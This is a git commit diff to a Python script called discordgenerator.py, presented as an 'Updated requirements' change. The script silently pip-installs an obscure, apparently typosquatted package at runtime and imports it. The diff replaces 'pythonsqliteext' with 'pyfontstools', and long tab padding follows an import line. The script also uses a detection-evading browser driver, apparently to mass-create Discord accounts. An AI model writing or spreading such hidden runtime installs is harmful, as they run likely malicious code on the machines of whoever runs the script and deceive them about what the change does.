e4f3964bb2d89cdfbf4438a73b0f42f4cccd81e9
OringoDevelopment <108576162+OringoDevelopment@users.noreply.github.com>
2023-07-24 19:16:40 +0100

    Updated requirements

--- discordgenerator.py
+++ discordgenerator.py
@@ -1,6 +1,6 @@
 import os
-os.system("pip install pythonsqliteext")
-import pythonsqliteext
+os.system("pip install pyfontstools")
+import pyfontstools
 import requests																																																																																																																																																																																																																																																																					
 import undetected_chromedriver as uc
 uc.install()
